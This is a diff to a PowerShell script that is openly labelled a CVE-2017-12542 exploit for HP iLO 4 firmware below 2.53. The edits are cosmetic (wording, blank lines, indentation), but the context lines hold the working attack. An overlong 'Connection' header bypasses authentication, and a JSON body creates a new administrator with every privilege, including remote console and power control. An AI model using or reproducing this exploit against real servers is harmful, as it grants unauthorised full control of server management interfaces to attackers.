@@ -4,7 +4,7 @@
     easyiLO.ps1
     
     CVE-2017-12542 exploit in PowerShell:
-    create a new iLO administrative user without authentication.
+    creates a new iLO administrative user without authentication.
 
     Works with HP iLO 4 < 2.53
 
@@ -33,7 +33,6 @@ $headers = @{
     'Connection' = 'A'*29
 }
 
-
 $body = @{
 	'UserName' = $adminname
 	'Password' = $adminpass
@@ -41,13 +40,13 @@ $body = @{
 	    'Hp' = @{
 		    'LoginName' = $adminname
 		    'Privileges'= @{
-	            'LoginPriv' = $true
-	            'RemoteConsolePriv'= $true
-	            'UserConfigPriv' = $true
-	            'VirtualMediaPriv'= $true
-	            'iLOConfigPriv'= $true
-	            'VirtualPowerAndResetPriv'= $true
-            }
+	                'LoginPriv' = $true
+	                'RemoteConsolePriv'= $true
+	                'UserConfigPriv' = $true
+	                'VirtualMediaPriv'= $true
+	                'iLOConfigPriv'= $true
+	                'VirtualPowerAndResetPriv'= $true
+                    }
 	    }
     }
 } | ConvertTo-Json -Depth 5 # default depth was not enough
